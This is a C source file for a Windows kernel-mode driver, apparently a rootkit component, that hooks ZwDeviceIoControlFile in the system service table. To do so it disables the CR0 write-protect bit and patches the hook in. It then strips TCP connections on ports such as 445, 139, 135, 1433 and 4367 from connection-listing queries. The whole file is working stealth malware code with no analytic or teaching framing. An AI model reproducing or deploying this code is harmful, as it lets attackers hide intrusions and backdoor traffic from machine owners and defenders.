
#ifdef __cplusplus
extern "C"
{
#endif

#include <ntddk.h>
#include "Driver.h"
#include "Jiurl_PortHide.h"
#include "Jiurl_tcpioctl.h"

#ifdef __cplusplus
}
#endif



NTSTATUS Jiurl_Entry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)
{
#ifdef GIVE_OUTPUT
	DbgPrint("Jiurl: Entered DriverEntry\n");
#endif
	DriverObject->MajorFunction[IRP_MJ_CREATE]         = 
	DriverObject->MajorFunction[IRP_MJ_CLOSE]          = Jiurl_Dispatch; 
	DriverObject->DriverUnload                         = Jiurl_Unload; 

	// save old system call locations
	OldZwDeviceIoControlFile = (ZWDEVICEIOCONTROLFILE)(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]);

	_asm
	{
		CLI					//dissable interrupt
		MOV	EAX, CR0		//move CR0 register into EAX
		AND EAX, NOT 10000H //disable WP bit 
		MOV	CR0, EAX		//write register back
	}

	(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]) = (ULONG)NewZwDeviceIoControlFile;

	_asm 
	{
		MOV	EAX, CR0		//move CR0 register into EAX
		OR	EAX, 10000H		//enable WP bit 	
		MOV	CR0, EAX		//write register back		
		STI					//enable interrupt
	}
        			
	return STATUS_SUCCESS;
}

NTSTATUS Jiurl_Dispatch(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp,IO_NO_INCREMENT);
    return Irp->IoStatus.Status;
}

void Jiurl_Unload(IN PDRIVER_OBJECT DriverObject)
{
#ifdef GIVE_OUTPUT
	DbgPrint("Jiurl: Entered DriverUnload\n");
#endif

	_asm
	{
		CLI					//dissable interrupt
		MOV	EAX, CR0		//move CR0 register into EAX
		AND EAX, NOT 10000H //disable WP bit 
		MOV	CR0, EAX		//write register back
	}

	(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]) = (ULONG)OldZwDeviceIoControlFile;

	_asm 
	{
		MOV	EAX, CR0		//move CR0 register into EAX
		OR	EAX, 10000H		//enable WP bit 	
		MOV	CR0, EAX		//write register back		
		STI					//enable interrupt
	}
}

int HiddenPorts[] =
{
	445,//lsass445,ntpass,dcom445,wkssvce445,wkssvco445
	139,//netbios,netdde
	135,//dcom135,wkssvce,wkssvco,svchost
	1433,//mssql
//	1434,//thcsql
//	42,//wins
	4367,
//	27999,
//	443,
	//8500,
	//6200,
	0,
};

BOOLEAN IsHiddenPort(int port)
{
	for (int i=0;HiddenPorts[i]!=0;i++)
	{
		if (port==HiddenPorts[i])
			return TRUE;
	}
	return FALSE;
}

NTSTATUS NewZwDeviceIoControlFile(IN HANDLE FileHandle,IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,IN ULONG IoControlCode,IN PVOID InputBuffer OPTIONAL,
    IN ULONG InputBufferLength,OUT PVOID OutputBuffer OPTIONAL,IN ULONG OutputBufferLength)
{
	NTSTATUS rc;

	rc = ((ZWDEVICEIOCONTROLFILE)(OldZwDeviceIoControlFile)) (
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		IoControlCode,
		InputBuffer,
		InputBufferLength,
		OutputBuffer,
		OutputBufferLength
		);

	if(IoControlCode != IOCTL_TCP_QUERY_INFORMATION_EX)
	{
		return(rc); 
	}

	TCP_REQUEST_QUERY_INFORMATION_EX	req;
	TCPAddrEntry*						TcpTable;
	TCPAddrExEntry*						TcpExTable;
	ULONG								numconn;
	LONG								i;

#ifdef GIVE_OUTPUT
	DbgPrint("Jiurl: IOCTL_TCP_QUERY_INFORMATION_EX\n");
#endif

	if( NT_SUCCESS( rc ) ) 
	{
		req.ID.toi_entity.tei_entity    = CO_TL_ENTITY;
		req.ID.toi_entity.tei_instance  = 0;
		req.ID.toi_class                = INFO_CLASS_PROTOCOL;
		req.ID.toi_type                 = INFO_TYPE_PROVIDER;
		req.ID.toi_id                   = TCP_MIB_ADDRTABLE_ENTRY_ID;

		if( !memcmp( InputBuffer, &req, sizeof(TDIObjectID) ) )
		{
			numconn  = IoStatusBlock->Information/sizeof(TCPAddrEntry);
			TcpTable = (TCPAddrEntry*)OutputBuffer;

			for( i=0; i<numconn; i++ )
			{
				if ( IsHiddenPort(ntohs(TcpTable[i].tae_ConnRemPort))
				||  IsHiddenPort(ntohs(TcpTable[i].tae_ConnLocalPort)) )
				{
#ifdef GIVE_OUTPUT
					DbgPrint("Jiurl: Hidden Port: %d / %d\n", ntohs(TcpTable[i].tae_ConnLocalPort), ntohs(TcpTable[i].tae_ConnRemPort));
#endif
					memcpy( (TcpTable+i), (TcpTable+i+1), ((numconn-i-1)*sizeof(TCPAddrEntry)) );
					numconn--;
					i--;
				}
				else
				{
#ifdef GIVE_OUTPUT
					DbgPrint("Jiurl: Not Hidden Port: %d / %d\n", ntohs(TcpTable[i].tae_ConnLocalPort), ntohs(TcpTable[i].tae_ConnRemPort));
#endif
				}
			}

			IoStatusBlock->Information = numconn*sizeof(TCPAddrEntry);
			return(rc);
		}


		req.ID.toi_id                   = TCP_MIB_ADDRTABLE_ENTRY_EX_ID;

		if( !memcmp( InputBuffer, &req, sizeof(TDIObjectID) ) )
		{
			numconn    = IoStatusBlock->Information/sizeof(TCPAddrExEntry);
			TcpExTable = (TCPAddrExEntry*)OutputBuffer;

			for( i=0; i<numconn; i++ )
			{
				if ( IsHiddenPort(ntohs(TcpTable[i].tae_ConnRemPort))
				||  IsHiddenPort(ntohs(TcpTable[i].tae_ConnLocalPort)) )
				{
#ifdef GIVE_OUTPUT
					DbgPrint("Jiurl: Hidden Port: %d / %d\n", ntohs(TcpTable[i].tae_ConnLocalPort), ntohs(TcpTable[i].tae_ConnRemPort));
#endif
					memcpy( (TcpExTable+i), (TcpExTable+i+1), ((numconn-i-1)*sizeof(TCPAddrExEntry)) );
					numconn--;
					i--;
				}
				else
				{
#ifdef GIVE_OUTPUT
					DbgPrint("Jiurl: Not Hidden Port: %d / %d\n", ntohs(TcpTable[i].tae_ConnLocalPort), ntohs(TcpTable[i].tae_ConnRemPort));
#endif
				}
			}

			IoStatusBlock->Information = numconn*sizeof(TCPAddrExEntry);
			return(rc);
		}
	}

	return(rc);
}

